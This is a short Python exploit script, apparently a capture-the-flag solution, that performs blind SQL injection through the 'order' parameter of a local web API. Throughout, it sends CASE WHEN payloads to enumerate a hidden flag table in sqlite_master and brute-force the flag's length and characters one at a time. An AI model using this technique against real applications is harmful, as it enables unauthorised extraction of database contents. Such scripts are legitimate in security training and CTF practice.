import requests
import json
from Helpers import *
from Brute import *

TARGET_URL = 'http://localhost:1337'

def req(pay):
    a = requests.post(TARGET_URL + '/api/list', json = {
        "order":"(CASE WHEN "+pay+" THEN id ELSE count END)",
    })
    id=0
    if not "wrong" in a.text:
        id=json.loads(a.text)[0]['id']
    return id==1

def checkTableChar(i,ch):
    payload="(SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name like 'flag_%') like 'flag/_"+i*"_"+"{ch}%' ESCAPE '/'".format(ch=ch)
    return req(payload)

def getFlagLength(i,flag_table):
    payload="(SELECT LENGTH(flag) FROM "+flag_table+")={}"
    return req(payload.format(i))

def getFlagChar(i,ch,flag_table):
    #charset=string.ascii_lowercase+string.ascii_uppercase+string.digits+"{"+"}"+"_"
    payload="(SELECT flag FROM "+flag_table+") LIKE binary '"+i*"_"+"{ch}%' ESCAPE '/'"

    if(ch=="_" or ch=="%" or ch=="\"" or ch=="\'" or ch=="/" or ch=="$"):
        ch="/"+ch

    return req(payload.format(ch=ch))

def Main():
    options=Helpers.getOptions()
    options['checkChar']=checkTableChar
    options['len']=10
    options['flag']='f68'
    brute = Brute(**options)
    flag=brute.run(5)

    print(flag)
    options=Helpers.getOptions()
    options['charset']=string.ascii_lowercase+string.ascii_uppercase+string.digits+"{"+"}"+"_"
    options['checkChar']=lambda i,ch: getFlagChar(i, ch, "flag_"+flag)
    options['checkLen']=lambda i: getFlagLength(i,"flag_"+flag)
    brute = Brute(**options)
    flag=brute.run(5)

Main()